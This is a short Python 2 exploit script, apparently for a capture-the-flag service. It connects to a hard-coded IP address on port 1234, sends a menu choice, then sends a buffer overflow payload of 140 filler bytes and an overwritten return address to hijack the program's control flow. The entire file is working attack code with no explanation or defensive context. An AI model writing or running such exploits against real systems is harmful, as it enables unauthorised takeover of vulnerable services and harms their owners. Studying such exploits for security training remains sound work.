import socket,time

shell = '5\n'
shellcode  = '1'*140
jmpaddr='\x06\x8b\x04\x08'
shellcode+=jmpaddr
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("222.18.158.229",1234))
s.send(shell)
time.sleep(1)
print s.recv(1024)
s.send(shellcode)
print s.recv(1024)
